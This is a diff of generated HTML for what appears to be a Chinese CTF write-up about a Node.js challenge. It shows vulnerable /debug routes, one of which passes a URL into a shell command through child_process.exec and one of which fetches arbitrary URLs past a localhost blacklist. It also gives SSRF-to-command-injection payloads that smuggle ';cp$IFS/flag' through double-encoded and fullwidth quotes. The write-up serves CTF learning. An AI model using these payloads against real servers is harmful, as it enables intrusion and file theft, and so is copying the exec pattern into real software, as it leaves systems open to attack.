-    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">ip</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">blacklist</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">ip</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">){</span>
-        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;res&#39;</span><span class="p">);</span>
-	<span class="kd">var</span> <span class="nx">u</span><span class="o">=</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[\&#34;\&#39;]/ig</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
-	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">u</span><span class="p">).</span><span class="nx">href</span><span class="p">);</span>
-	<span class="kd">let</span> <span class="nx">log</span><span class="o">=</span><span class="sb">`echo  &#39;</span><span class="si">${</span><span class="nx">url</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">u</span><span class="p">).</span><span class="nx">href</span><span class="si">}</span><span class="sb">&#39;&gt;&gt;/tmp/log`</span><span class="p">;</span>
-	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">log</span><span class="p">);</span>
-	<span class="nx">child_process</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">log</span><span class="p">);</span>
-	<span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="nx">data</span><span class="o">:</span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;/tmp/log&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()});</span>
-    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({});</span>
-    <span class="p">}</span>
-<span class="p">});</span>
-
-<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/debug&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">url</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
-        <span class="kd">var</span> <span class="nx">u</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
-	<span class="kd">var</span> <span class="nx">urlObject</span><span class="o">=</span><span class="nx">url</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">u</span><span class="p">);</span>
-	<span class="k">if</span><span class="p">(</span><span class="nx">blacklist</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">urlObject</span><span class="p">.</span><span class="nx">hostname</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
-		<span class="kd">var</span> <span class="nx">dest</span><span class="o">=</span><span class="nx">urlObject</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
-		<span class="nx">request</span><span class="p">(</span><span class="nx">dest</span><span class="p">,(</span><span class="nx">err</span><span class="p">,</span><span class="nx">result</span><span class="p">,</span><span class="nx">body</span><span class="p">)=&gt;{</span>
-			<span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">body</span><span class="p">);</span>
-		<span class="p">})</span>
-	<span class="p">}</span>
-	<span class="k">else</span><span class="p">{</span>
-		<span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">([]);</span>
-	<span class="p">}</span>
-	<span class="p">}</span>
-<span class="p">});</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">blacklist</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;127.0.0.1.xip.io&#39;</span><span class="p">,</span><span class="s1">&#39;::ffff:127.0.0.1&#39;</span><span class="p">,</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span><span class="s1">&#39;[::1]&#39;</span><span class="p">,</span><span class="s1">&#39;::1&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/debug&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">ip</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">blacklist</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">ip</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;res&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">u</span><span class="o">=</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[\&#34;\&#39;]/ig</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">u</span><span class="p">).</span><span class="nx">href</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">log</span><span class="o">=</span><span class="sb">`echo  &#39;</span><span class="si">${</span><span class="nx">url</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">u</span><span class="p">).</span><span class="nx">href</span><span class="si">}</span><span class="sb">&#39;&gt;&gt;/tmp/log`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">log</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">child_process</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">log</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="nx">data</span><span class="o">:</span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;/tmp/log&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/debug&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">url</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">u</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">urlObject</span><span class="o">=</span><span class="nx">url</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">blacklist</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">urlObject</span><span class="p">.</span><span class="nx">hostname</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">dest</span><span class="o">=</span><span class="nx">urlObject</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">request</span><span class="p">(</span><span class="nx">dest</span><span class="p">,(</span><span class="nx">err</span><span class="p">,</span><span class="nx">result</span><span class="p">,</span><span class="nx">body</span><span class="p">)=&gt;{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">body</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">})</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">([]);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>一看到黑名单内容就想到SSRF，但是这缩进就nm离谱，还以为黑名单卵用没有。。。不知道算不算出题人的恶趣味，继续往下做，log存在命令注入，但是需要本地访问才能命令执行，所以要通过POST SSRF。</p>
 <p>payload</p>
@@ -762,11 +762,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="c1">// 二次编码
-</span><span class="c1"></span><span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;http://127.1:3000/debug?url=http://%2527;cp$IFS/flag$IFS/tmp/log%00&#34;</span><span class="p">}</span>
-<span class="c1">// 特殊编码 =&gt; %EF%BC%87解码为&#39;
-</span><span class="c1"></span><span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;http://127.1:3000/debug?url=http://%EF%BC%87;cp$IFS/flag$IFS/tmp/log%00&#34;</span><span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// 二次编码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;http://127.1:3000/debug?url=http://%2527;cp$IFS/flag$IFS/tmp/log%00&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 特殊编码 =&gt; %EF%BC%87解码为&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;http://127.1:3000/debug?url=http://%EF%BC%87;cp$IFS/flag$IFS/tmp/log%00&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div>
             </div>
